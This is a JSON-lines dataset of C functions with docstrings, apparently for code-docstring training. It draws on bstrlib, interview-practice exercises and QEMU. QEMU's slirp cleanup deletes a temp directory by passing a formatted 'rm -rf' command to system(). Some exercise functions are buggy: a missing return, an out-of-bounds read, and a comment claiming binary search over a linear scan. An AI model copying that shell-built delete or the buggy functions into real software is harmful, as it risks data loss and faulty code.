{"docstring": "/*  int bsetstr (bstring b0, int pos, bstring b1, unsigned char fill)\n *\n *  Overwrite the string b0 starting at position pos with the string b1. If \n *  the position pos is past the end of b0, then the character \"fill\" is \n *  appended as necessary to make up the gap between the end of b0 and pos.\n *  If b1 is NULL, it behaves as if it were a 0-length string.\n */\n", "func_signal": "int bsetstr (bstring b0, int pos, const_bstring b1, unsigned char fill)", "code": "{\nint d, newlen;\nptrdiff_t pd;\nbstring aux = (bstring) b1;\n\n\tif (pos < 0 || b0 == NULL || b0->slen < 0 || NULL == b0->data || \n\t    b0->mlen < b0->slen || b0->mlen <= 0) return BSTR_ERR;\n\tif (b1 != NULL && (b1->slen < 0 || b1->data == NULL)) return BSTR_ERR;\n\n\td = pos;\n\n\t/* Aliasing case */\n\tif (NULL != aux) {\n\t\tif ((pd = (ptrdiff_t) (b1->data - b0->data)) >= 0 && pd < (ptrdiff_t) b0->mlen) {\n\t\t\tif (NULL == (aux = bstrcpy (b1))) return BSTR_ERR;\n\t\t}\n\t\td += aux->slen;\n\t}\n\n\t/* Increase memory size if necessary */\n\tif (balloc (b0, d + 1) != BSTR_OK) {\n\t\tif (aux != b1) bdestroy (aux);\n\t\treturn BSTR_ERR;\n\t}\n\n\tnewlen = b0->slen;\n\n\t/* Fill in \"fill\" character as necessary */\n\tif (pos > newlen) {\n\t\tbstr__memset (b0->data + b0->slen, (int) fill, (size_t) (pos - b0->slen));\n\t\tnewlen = pos;\n\t}\n\n\t/* Copy b1 to position pos in b0. */\n\tif (aux != NULL) {\n\t\tbBlockCopy ((char *) (b0->data + pos), (char *) aux->data, aux->slen);\n\t\tif (aux != b1) bdestroy (aux);\n\t}\n\n\t/* Indicate the potentially increased size of b0 */\n\tif (d > newlen) newlen = d;\n\n\tb0->slen = newlen;\n\tb0->data[newlen] = (unsigned char) '\\0';\n\n\treturn BSTR_OK;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  int bstrListAllocMin (struct bstrList * sl, int msz)\n *\n *  Try to allocate the minimum amount of memory for the list to include at\n *  least msz entries or sl->qty whichever is greater.\n */\n", "func_signal": "int bstrListAllocMin (struct bstrList * sl, int msz)", "code": "{\nbstring * l;\nsize_t nsz;\n\tif (!sl || msz <= 0 || !sl->entry || sl->qty < 0 || sl->mlen <= 0 || sl->qty > sl->mlen) return BSTR_ERR;\n\tif (msz < sl->qty) msz = sl->qty;\n\tif (sl->mlen == msz) return BSTR_OK;\n\tnsz = ((size_t) msz) * sizeof (bstring);\n\tif (nsz < (size_t) msz) return BSTR_ERR;\n\tl = (bstring *) bstr__realloc (sl->entry, nsz);\n\tif (!l) return BSTR_ERR;\n\tsl->mlen = msz;\n\tsl->entry = l;\n\treturn BSTR_OK;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  int bassignmidstr (bstring a, const_bstring b, int left, int len)\n *\n *  Overwrite the string a with the middle of contents of string b \n *  starting from position left and running for a length len.  left and \n *  len are clamped to the ends of b as with the function bmidstr.\n */\n", "func_signal": "int bassignmidstr (bstring a, const_bstring b, int left, int len)", "code": "{\n\tif (b == NULL || b->data == NULL || b->slen < 0)\n\t\treturn BSTR_ERR;\n\n\tif (left < 0) {\n\t\tlen += left;\n\t\tleft = 0;\n\t}\n\n\tif (len > b->slen - left) len = b->slen - left;\n\n\tif (a == NULL || a->data == NULL || a->mlen < a->slen ||\n\t    a->slen < 0 || a->mlen == 0)\n\t\treturn BSTR_ERR;\n\n\tif (len > 0) {\n\t\tif (balloc (a, len) != BSTR_OK) return BSTR_ERR;\n\t\tbstr__memmove (a->data, b->data + left, len);\n\t\ta->slen = len;\n\t} else {\n\t\ta->slen = 0;\n\t}\n\ta->data[a->slen] = (unsigned char) '\\0';\n\treturn BSTR_OK;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  bstring bread (bNread readPtr, void * parm)\n *\n *  Use a finite buffer fread-like function readPtr to create a bstring \n *  filled with the entire contents of file-like source data in a roughly \n *  efficient way.\n */\n", "func_signal": "bstring bread (bNread readPtr, void * parm)", "code": "{\nbstring buff;\n\n\tif (0 > breada (buff = bfromcstr (\"\"), readPtr, parm)) {\n\t\tbdestroy (buff);\n\t\treturn NULL;\n\t}\n\treturn buff;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  int bstrchrp (const_bstring b, int c, int pos)\n *\n *  Search for the character c in b forwards from the position pos \n *  (inclusive).\n */\n", "func_signal": "int bstrchrp (const_bstring b, int c, int pos)", "code": "{\nunsigned char * p;\n\n\tif (b == NULL || b->data == NULL || b->slen <= pos || pos < 0) return BSTR_ERR;\n\tp = (unsigned char *) bstr__memchr ((b->data + pos), (unsigned char) c, (b->slen - pos));\n\tif (p) return (int) (p - b->data);\n\treturn BSTR_ERR;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "//\u9012\u5f52\u8f93\u51fa\u540e\u5e8f\u5e8f\u5217\n", "func_signal": "void postOrder(treeNode *root)", "code": "{\n    if(root)\n    {\n        postOrder(root->lchild);\n        postOrder(root->rchild);\n        printf(\"%d \",root->data);\n    }\n}", "path": "6-buildBinarytree.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u7b2c\u4e8c\u6b65:\u7ed9\u65b0\u8282\u70b9\u8bbe\u7f6esibling\u57df\n", "func_signal": "void setSibling(ListNode *phead)", "code": "{\n    ListNode *p=phead;\n    ListNode *pclone=NULL;\n    while(p!=NULL)\n    {\n        pclone=p->next;\n        if(p->sibling!=NULL)\n        pclone->sibling=p->sibling->next;\n        p=pclone->next;\n    }\n}", "path": "26-copyComlexlist.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u521b\u5efa\u94fe\u8868\u3002\n", "func_signal": "list_node *createList()", "code": "{\n    int n;\n    list_node *pHead=NULL,*p;\n    list_node *tail= pHead;\n    int node_data[]={0,1,2,3,4,5,6,7,8};\n    int i=0;\n    while(i<9)\n    {\n        p=(list_node *)malloc(sizeof(list_node));\n        p->data=node_data[i];\n        p->next=NULL;\n        if(pHead==NULL)\n            pHead=p;\n        else\n            tail->next=p;\n        tail=p;\n        if(i==4)\n            pToDelete=tail;\n        i++;\n        //\u5047\u8bbe\u8981\u5220\u9664\u7684\u8282\u70b9\u5c31\u662f4\n    }\n    return pHead;\n}", "path": "13-deleteNode.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u6309\u7167\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u521b\u5efa\u4e8c\u53c9\u6811\n", "func_signal": "treeNode *createTree()", "code": "{\n    int key;\n    treeNode *p=NULL;\n    scanf(\"%d\",&key);\n    if(key!=-1)\n    {\n        p=(treeNode *)malloc(sizeof(treeNode));\n        p->data=key;\n        p->lchild=createTree();\n        p->rchild=createTree();\n    }\n    else\n        return NULL;\n    return p;\n}", "path": "18-subTree.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u68c0\u67e5\u67d0\u6574\u6570number\u662f\u5426\u51fa\u73b0\u6b21\u6570\u8d85\u8fc7\u4e00\u534a\n", "func_signal": "int is_than_half(int *num,int length,int number)", "code": "{\n    int times=0,i=0;\n    int than_half=0;\n    for(i=0;i<length;i++)\n    {\n        if(num[i]==number)\n            times++;\n    }\n    if(times*2>length)\n        than_half=1;\n    else\n        input_valid=0;\n}", "path": "29-more_than_half.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u904d\u5386\u9012\u5f52\u65b9\u6cd5\n", "func_signal": "void PreOrderTraverse(treeNode *T)", "code": "{\n    if(!T)\n        return;\n    printf(\"%d\\t\",T->data);\n    PreOrderTraverse(T->lchild);\n    PreOrderTraverse(T->rchild);\n}", "path": "18-subTree.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u56e0\u4e3a\u53ef\u80fd\u8981\u6539\u53d8\u5934\u8282\u70b9\u7684\u503c\uff0c\u6240\u4ee5\u8981\u4f20\u4e8c\u7ef4\u6307\u9488\n", "func_signal": "void delete_node(list_node **ppHead,list_node *pToDelete)", "code": "{\n    if(!ppHead||!pToDelete)\n        return;\n    //\u666e\u901a\u60c5\u51b5\uff0c\u4e0d\u662f\u5220\u5c3e\u8282\u70b9\n    if(pToDelete->next!=NULL)\n    {\n        list_node *pnext=pToDelete->next;\n        pToDelete->data=pnext->data;\n        pToDelete->next=pnext->next;\n        free(pnext);\n        pnext=NULL;\n    }\n    //\u94fe\u8868\u53ea\u6709\u4e00\u4e2a\u8282\u70b9\uff0c\u5c31\u662f\u5220\u9664\u8fd9\u4e2a\u8282\u70b9\n    else if(*ppHead==pToDelete)\n    {\n        free(pToDelete);\n        pToDelete=NULL;\n        *ppHead=NULL;\n    }\n    else //\u94fe\u8868\u6709\u591a\u4e2a\u8282\u70b9\uff0c\u5220\u9664\u5c3e\u8282\u70b9\uff0c\u8fd9\u53ea\u6709\u904d\u5386\u4e86\u3002\n    {\n        list_node *pnode=*ppHead;\n        while(pnode->next!=pToDelete)\n            pnode=pnode->next;\n        pnode->next=NULL;\n        free(pToDelete);\n        pToDelete=NULL;\n    }\n}", "path": "13-deleteNode.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u5148\u5e8f\u5e8f\u5217\u548c\u4e2d\u5e8f\u5e8f\u5217\u7684\u957f\u5ea6\u5fc5\u987b\u76f8\u540c\uff0c\u4e3aorderLen\n", "func_signal": "treeNode *buildNode(int *preOrder,int *inOrder,int orderLen)", "code": "{\n    if(preOrder == NULL||inOrder == NULL||orderLen==0)\n        return NULL;\n    //inParent\u662f\u5f53\u524dparent\u5728\u4e2d\u5e8f\u91cc\u7684\u4e0b\u6807\n    int inParent=0;\n    treeNode *parent=(treeNode *)malloc(sizeof(treeNode));\n    parent->data = preOrder[0];\n    parent->lchild = NULL;\n    parent->rchild = NULL;\n    if(orderLen==1) \n        return parent;\n    while(inParent<orderLen)\n    {\n        if(inOrder[inParent]!=parent->data)\n            inParent ++;\n        else\n            break;\n    }\n    if(inParent==orderLen && inOrder[inParent]!=parent->data)\n    {\n        printf(\"Invalid Order list.\\n\");\n        exit(1);\n    }\n    if(inParent > 0)\n    {\n        parent->lchild = buildNode(preOrder+1,inOrder,inParent);\n    }\n    if(inParent+1 < orderLen)\n    {\n        parent->rchild = buildNode(preOrder+inParent+1,inOrder+inParent+1,orderLen-inParent-1);\n    }\n    return parent;\n}", "path": "6-buildBinarytree.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u7b2c\u4e00\u6b65:\u5728\u539f\u59cb\u8282\u70b9\u540e\u9762\u590d\u5236\u51fa\u65b0\u8282\u70b9\n", "func_signal": "void cloneNodes(ListNode *phead)", "code": "{\n    ListNode *p=phead;\n    ListNode *pclone=NULL;\n    while(p!=NULL)\n    {\n        pclone=(ListNode *)malloc(sizeof(ListNode));\n        pclone->ch=p->ch;\n        pclone->next=p->next;\n        pclone->sibling=NULL;\n        p->next=pclone;\n        p=pclone->next;\n    }\n}", "path": "26-copyComlexlist.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u627e\u51fa\u53ef\u80fd\u8d85\u8fc7\u4e00\u534a\u7684\u90a3\u4e2a\u6570\uff0c\u7136\u540e\u8c03\u7528is_than_half\n//\u5bf9\u8be5\u6570\u786e\u8ba4\n", "func_signal": "int more_than_half(int *num,int length)", "code": "{\n    int result = num[0];\n    int i,times=1;\n    if(num==NULL||length<=0)\n    {\n        input_valid=0;\n        return 0;\n    }\n\n    for(i=0;i<length;i++)\n    {\n        if(times==0)\n        {\n            result=num[i];\n            times++;\n        }\n        else if(num[i]==result)\n            times++;\n        else\n            times--;\n    }\n    return result;\n}", "path": "29-more_than_half.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u4f7f\u7528\u4e8c\u5206\u67e5\u627e\u7684\u65b9\u5f0f\uff0c\u4f7f\u5f97\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(logn)\n", "func_signal": "int minInOrder(int *num,int index1,int index2)", "code": "{\n    int result=num[index1];\n    int i=0;\n    while(i<=index2)\n    {\n        if(result>num[i])\n            result=num[i];\n        i++;\n    }\n    return result;\n}", "path": "8-minInRotate.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u6253\u5370\u94fe\u8868\n", "func_signal": "void print_list(list_node *pHead)", "code": "{\n    while(pHead)\n    {\n        printf(\"%d\\t\",pHead->data);\n        pHead=pHead->next;\n    }\n    printf(\"\\n\");\n}", "path": "13-deleteNode.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u91ca\u653e\u6389\u6574\u4e2a\u4e8c\u53c9\u6811\n", "func_signal": "void freeTree(treeNode **pT)", "code": "{\n    if(*pT != NULL)\n    {\n        freeTree(&((*pT)->lchild));\n        freeTree(&((*pT)->rchild));\n        free(*pT);\n        *pT=NULL;\n    }\n    return;\n}", "path": "6-buildBinarytree.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u8fd4\u56de\u7b2cindex\u4e2a\u4e11\u6570\n", "func_signal": "int get_ugly_number(int index)", "code": "{\n    if(index<0)\n        return 0;\n    int *ugly_num=(int *)malloc(sizeof(int)*index);\n    memset(ugly_num,0,index*sizeof(int));\n    ugly_num[0]=1;\n    int next_ugly=1;\n    int *p2=ugly_num;\n    int *p3=ugly_num;\n    int *p5=ugly_num;\n    while(next_ugly<index)\n    {\n        int min_num = min(*p2*2,*p3*3,*p5*5);\n        ugly_num[next_ugly]=min_num;\n        while(*p2*2<=ugly_num[next_ugly])\n            ++p2;\n        while(*p3*3<=ugly_num[next_ugly])\n            ++p3;\n        while(*p5*5<=ugly_num[next_ugly])\n            ++p5;\n        ++next_ugly;\n    }\n   int wanted_ugly=ugly_num[next_ugly-1];\n   free(ugly_num);\n   return wanted_ugly;\n}", "path": "34-ugly_number.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u7b2c\u4e09\u6b65:\u8ba9\u65b0\u8282\u70b9\u8131\u79bb\u539f\u59cb\u8282\u70b9\u5f62\u6210\u65b0\u94fe\u8868\n", "func_signal": "ListNode *reconnectNodes(ListNode *phead)", "code": "{\n    ListNode *p=phead;\n    ListNode *clonehead=NULL;\n    ListNode *pclone=NULL;\n    if(p!=NULL)\n    {\n        clonehead=pclone=p->next;\n        p->next=pclone->next;\n        p=p->next;\n    }\n    while(p!=NULL)\n    {\n        pclone->next=p->next;\n        pclone=pclone->next;\n        p->next=pclone->next;\n        p=p->next;\n    }\n    return clonehead;\n}", "path": "26-copyComlexlist.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u6309\u7167\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u521b\u5efa\u4e8c\u53c9\u6811\n", "func_signal": "treeNode *createTree(treeNode *parent)", "code": "{\n    int key;\n    treeNode *p=NULL;\n    scanf(\"%d\",&key);\n    if(key!=-1)\n    {\n        p=(treeNode *)malloc(sizeof(treeNode));\n        p->data=key;\n        p->parent=parent;\n        parent=p;\n        p->lchild=createTree(parent);\n        p->rchild=createTree(parent);\n    }\n    else\n        return NULL;\n    return p;\n}", "path": "50-lowest_common_parent.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u6309\u7167\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u521b\u5efa\u4e8c\u53c9\u6811\n", "func_signal": "treeNode *createTree()", "code": "{\n    int key;\n    treeNode *p=NULL;\n    scanf(\"%d\",&key);\n    if(key!=-1)\n    {\n        p=(treeNode *)malloc(sizeof(treeNode));\n        p->data=key;\n        p->lchild=createTree();\n        p->rchild=createTree();\n    }\n    else\n        return NULL;\n    return p;\n}", "path": "39-tree_depth.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u6309\u7167\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u521b\u5efa\u4e8c\u53c9\u6811\n", "func_signal": "treeNode *createTree()", "code": "{\n    int key;\n    treeNode *p=NULL;\n    scanf(\"%d\",&key);\n    if(key!=-1)\n    {\n        p=(treeNode *)malloc(sizeof(treeNode));\n        p->data=key;\n        p->lchild=createTree();\n        p->rchild=createTree();\n    }\n    else\n        return NULL;\n    return p;\n}", "path": "27-convertBST.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u6309\u7167\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u521b\u5efa\u4e8c\u53c9\u6811\n", "func_signal": "treeNode *createTree()", "code": "{\n    int key;\n    treeNode *p=NULL;\n    scanf(\"%d\",&key);\n    if(key!=-1)\n    {\n        p=(treeNode *)malloc(sizeof(treeNode));\n        p->data=key;\n        p->lchild=createTree();\n        p->rchild=createTree();\n    }\n    else\n        return NULL;\n    return p;\n}", "path": "39-is_balanced_tree.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "//\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u904d\u5386\u9012\u5f52\u65b9\u6cd5\n", "func_signal": "void PreOrderTraverse(treeNode *T,int node1,int node2)", "code": "{\n    if(!T)\n        return;\n    if(T->data==node1)\n        pnode1=T;\n    if(T->data==node2)\n        pnode2=T;\n    PreOrderTraverse(T->lchild,node1,node2);\n    PreOrderTraverse(T->rchild,node1,node2);\n}", "path": "50-lowest_common_parent.c", "repo_name": "taohi/interview", "stars": 68, "license": "None", "language": "c", "size": 686}
{"docstring": "/* class_init for the \"host\" CPU model\n *\n * This function may be called before KVM is initialized.\n */\n", "func_signal": "static void host_x86_cpu_class_init(ObjectClass *oc, void *data)", "code": "{\n    X86CPUClass *xcc = X86_CPU_CLASS(oc);\n    uint32_t eax = 0, ebx = 0, ecx = 0, edx = 0;\n\n    xcc->kvm_required = true;\n\n    host_cpuid(0x0, 0, &eax, &ebx, &ecx, &edx);\n    x86_cpu_vendor_words2str(host_cpudef.vendor, ebx, edx, ecx);\n\n    host_cpuid(0x1, 0, &eax, &ebx, &ecx, &edx);\n    host_cpudef.family = ((eax >> 8) & 0x0F) + ((eax >> 20) & 0xFF);\n    host_cpudef.model = ((eax >> 4) & 0x0F) | ((eax & 0xF0000) >> 12);\n    host_cpudef.stepping = eax & 0x0F;\n\n    cpu_x86_fill_model_id(host_cpudef.model_id);\n\n    xcc->cpu_def = &host_cpudef;\n    host_cpudef.cache_info_passthrough = true;\n\n    /* level, xlevel, xlevel2, and the feature words are initialized on\n     * instance_init, because they require KVM to be initialized.\n     */\n}", "path": "qemu\\target-i386\\cpu.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* general substring compare of *[s1..e1) and *[s2..e2).  sx is start of\n * a substring.  ex if !NULL points to the first char after a substring,\n * otherwise the string is assumed to sized by a terminating nul.\n * Return lexical ordering of *s1:*s2.\n */\n", "func_signal": "static int sstrcmp(const char *s1, const char *e1, const char *s2,\n    const char *e2)", "code": "{\n    for (;;) {\n        if (!*s1 || !*s2 || *s1 != *s2)\n            return (*s1 - *s2);\n        ++s1, ++s2;\n        if (s1 == e1 && s2 == e2)\n            return (0);\n        else if (s1 == e1)\n            return (*s2);\n        else if (s2 == e2)\n            return (*s1);\n    }\n}", "path": "qemu\\target-i386\\cpu.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* generate CPU information. */\n", "func_signal": "void x86_cpu_list(FILE *f, fprintf_function cpu_fprintf)", "code": "{\n    X86CPUDefinition *def;\n    char buf[256];\n    int i;\n\n    for (i = 0; i < ARRAY_SIZE(builtin_x86_defs); i++) {\n        def = &builtin_x86_defs[i];\n        snprintf(buf, sizeof(buf), \"%s\", def->name);\n        (*cpu_fprintf)(f, \"x86 %16s  %-48s\\n\", buf, def->model_id);\n    }\n#ifdef CONFIG_KVM\n    (*cpu_fprintf)(f, \"x86 %16s  %-48s\\n\", \"host\",\n                   \"KVM processor with all supported host features \"\n                   \"(only available in KVM mode)\");\n#endif\n\n    (*cpu_fprintf)(f, \"\\nRecognized CPUID flags:\\n\");\n    for (i = 0; i < ARRAY_SIZE(feature_word_info); i++) {\n        FeatureWordInfo *fw = &feature_word_info[i];\n\n        listflags(buf, sizeof(buf), (uint32_t)~0, fw->feat_names, 1);\n        (*cpu_fprintf)(f, \"  %s\\n\", buf);\n    }\n}", "path": "qemu\\target-i386\\cpu.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* automatic user mode samba server configuration (legacy interface) */\n", "func_signal": "int net_slirp_smb(const char *exported_dir)", "code": "{\n    struct in_addr vserver_addr = { .s_addr = 0 };\n\n    if (legacy_smb_export) {\n        fprintf(stderr, \"-smb given twice\\n\");\n        return -1;\n    }\n    legacy_smb_export = exported_dir;\n    if (!QTAILQ_EMPTY(&slirp_stacks)) {\n        return slirp_smb(QTAILQ_FIRST(&slirp_stacks), exported_dir,\n                         vserver_addr);\n    }\n    return 0;\n}", "path": "qemu\\net\\slirp.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* generate a composite string into buf of all cpuid names in featureset\n * selected by fbits.  indicate truncation at bufsize in the event of overflow.\n * if flags, suppress names undefined in featureset.\n */\n", "func_signal": "static void listflags(char *buf, int bufsize, uint32_t fbits,\n    const char **featureset, uint32_t flags)", "code": "{\n    const char **p = &featureset[31];\n    char *q, *b, bit;\n    int nc;\n\n    b = 4 <= bufsize ? buf + (bufsize -= 3) - 1 : NULL;\n    *buf = '\\0';\n    for (q = buf, bit = 31; fbits && bufsize; --p, fbits &= ~(1 << bit), --bit)\n        if (fbits & 1 << bit && (*p || !flags)) {\n            if (*p)\n                nc = snprintf(q, bufsize, \"%s%s\", q == buf ? \"\" : \" \", *p);\n            else\n                nc = snprintf(q, bufsize, \"%s[%d]\", q == buf ? \"\" : \" \", bit);\n            if (bufsize <= nc) {\n                if (b) {\n                    memcpy(b, \"...\", sizeof(\"...\"));\n                }\n                return;\n            }\n            q += nc;\n            bufsize -= nc;\n        }\n}", "path": "qemu\\target-i386\\cpu.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* CPUClass::reset() */\n", "func_signal": "static void x86_cpu_reset(CPUState *s)", "code": "{\n    X86CPU *cpu = X86_CPU(s);\n    X86CPUClass *xcc = X86_CPU_GET_CLASS(cpu);\n    CPUX86State *env = &cpu->env;\n    int i;\n\n    xcc->parent_reset(s);\n\n    memset(env, 0, offsetof(CPUX86State, cpuid_level));\n\n    tlb_flush(s, 1);\n\n    env->old_exception = -1;\n\n    /* init to reset state */\n\n#ifdef CONFIG_SOFTMMU\n    env->hflags |= HF_SOFTMMU_MASK;\n#endif\n    env->hflags2 |= HF2_GIF_MASK;\n\n    cpu_x86_update_cr0(env, 0x60000010);\n    env->a20_mask = ~0x0;\n    env->smbase = 0x30000;\n\n    env->idt.limit = 0xffff;\n    env->gdt.limit = 0xffff;\n    env->ldt.limit = 0xffff;\n    env->ldt.flags = DESC_P_MASK | (2 << DESC_TYPE_SHIFT);\n    env->tr.limit = 0xffff;\n    env->tr.flags = DESC_P_MASK | (11 << DESC_TYPE_SHIFT);\n\n    cpu_x86_load_seg_cache(env, R_CS, 0xf000, 0xffff0000, 0xffff,\n                           DESC_P_MASK | DESC_S_MASK | DESC_CS_MASK |\n                           DESC_R_MASK | DESC_A_MASK);\n    cpu_x86_load_seg_cache(env, R_DS, 0, 0, 0xffff,\n                           DESC_P_MASK | DESC_S_MASK | DESC_W_MASK |\n                           DESC_A_MASK);\n    cpu_x86_load_seg_cache(env, R_ES, 0, 0, 0xffff,\n                           DESC_P_MASK | DESC_S_MASK | DESC_W_MASK |\n                           DESC_A_MASK);\n    cpu_x86_load_seg_cache(env, R_SS, 0, 0, 0xffff,\n                           DESC_P_MASK | DESC_S_MASK | DESC_W_MASK |\n                           DESC_A_MASK);\n    cpu_x86_load_seg_cache(env, R_FS, 0, 0, 0xffff,\n                           DESC_P_MASK | DESC_S_MASK | DESC_W_MASK |\n                           DESC_A_MASK);\n    cpu_x86_load_seg_cache(env, R_GS, 0, 0, 0xffff,\n                           DESC_P_MASK | DESC_S_MASK | DESC_W_MASK |\n                           DESC_A_MASK);\n\n    env->eip = 0xfff0;\n    env->regs[R_EDX] = env->cpuid_version;\n\n    env->eflags = 0x2;\n\n    /* FPU init */\n    for (i = 0; i < 8; i++) {\n        env->fptags[i] = 1;\n    }\n    env->fpuc = 0x37f;\n\n    env->mxcsr = 0x1f80;\n    env->xstate_bv = XSTATE_FP | XSTATE_SSE;\n\n    env->pat = 0x0007040600070406ULL;\n    env->msr_ia32_misc_enable = MSR_IA32_MISC_ENABLE_DEFAULT;\n\n    memset(env->dr, 0, sizeof(env->dr));\n    env->dr[6] = DR6_FIXED_1;\n    env->dr[7] = DR7_FIXED_1;\n    cpu_breakpoint_remove_all(s, BP_CPU);\n    cpu_watchpoint_remove_all(s, BP_CPU);\n\n    env->xcr0 = 1;\n\n#if !defined(CONFIG_USER_ONLY)\n    /* We hard-wire the BSP to the first CPU. */\n    if (s->cpu_index == 0) {\n        apic_designate_bsp(cpu->apic_state);\n    }\n\n    s->halted = !cpu_is_bsp(cpu);\n\n    if (kvm_enabled()) {\n        kvm_arch_reset_vcpu(cpu);\n    }\n#endif\n}", "path": "qemu\\target-i386\\cpu.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* automatic user mode samba server configuration */\n", "func_signal": "static void slirp_smb_cleanup(SlirpState *s)", "code": "{\n    char cmd[128];\n    int ret;\n\n    if (s->smb_dir[0] != '\\0') {\n        snprintf(cmd, sizeof(cmd), \"rm -rf %s\", s->smb_dir);\n        ret = system(cmd);\n        if (ret == -1 || !WIFEXITED(ret)) {\n            error_report(\"'%s' failed.\", cmd);\n        } else if (WEXITSTATUS(ret)) {\n            error_report(\"'%s' failed. Error code: %d\",\n                         cmd, WEXITSTATUS(ret));\n        }\n        s->smb_dir[0] = '\\0';\n    }\n}", "path": "qemu\\net\\slirp.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* Initialize list of CPU models, filling some non-static fields if necessary\n */\n", "func_signal": "void x86_cpudef_setup(void)", "code": "{\n    int i, j;\n    static const char *model_with_versions[] = { \"qemu32\", \"qemu64\", \"athlon\" };\n\n    for (i = 0; i < ARRAY_SIZE(builtin_x86_defs); ++i) {\n        X86CPUDefinition *def = &builtin_x86_defs[i];\n\n        /* Look for specific \"cpudef\" models that */\n        /* have the QEMU version in .model_id */\n        for (j = 0; j < ARRAY_SIZE(model_with_versions); j++) {\n            if (strcmp(model_with_versions[j], def->name) == 0) {\n                pstrcpy(def->model_id, sizeof(def->model_id),\n                        \"QEMU Virtual CPU version \");\n                pstrcat(def->model_id, sizeof(def->model_id),\n                        qemu_get_version());\n                break;\n            }\n        }\n    }\n}", "path": "qemu\\target-i386\\cpu.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* Load data from X86CPUDefinition\n */\n", "func_signal": "static void x86_cpu_load_def(X86CPU *cpu, X86CPUDefinition *def, Error **errp)", "code": "{\n    CPUX86State *env = &cpu->env;\n    const char *vendor;\n    char host_vendor[CPUID_VENDOR_SZ + 1];\n\n    object_property_set_int(OBJECT(cpu), def->level, \"level\", errp);\n    object_property_set_int(OBJECT(cpu), def->family, \"family\", errp);\n    object_property_set_int(OBJECT(cpu), def->model, \"model\", errp);\n    object_property_set_int(OBJECT(cpu), def->stepping, \"stepping\", errp);\n    env->features[FEAT_1_EDX] = def->features[FEAT_1_EDX];\n    env->features[FEAT_1_ECX] = def->features[FEAT_1_ECX];\n    env->features[FEAT_8000_0001_EDX] = def->features[FEAT_8000_0001_EDX];\n    env->features[FEAT_8000_0001_ECX] = def->features[FEAT_8000_0001_ECX];\n    object_property_set_int(OBJECT(cpu), def->xlevel, \"xlevel\", errp);\n    env->features[FEAT_KVM] = def->features[FEAT_KVM];\n    env->features[FEAT_SVM] = def->features[FEAT_SVM];\n    env->features[FEAT_C000_0001_EDX] = def->features[FEAT_C000_0001_EDX];\n    env->features[FEAT_7_0_EBX] = def->features[FEAT_7_0_EBX];\n    env->cpuid_xlevel2 = def->xlevel2;\n    cpu->cache_info_passthrough = def->cache_info_passthrough;\n\n    object_property_set_str(OBJECT(cpu), def->model_id, 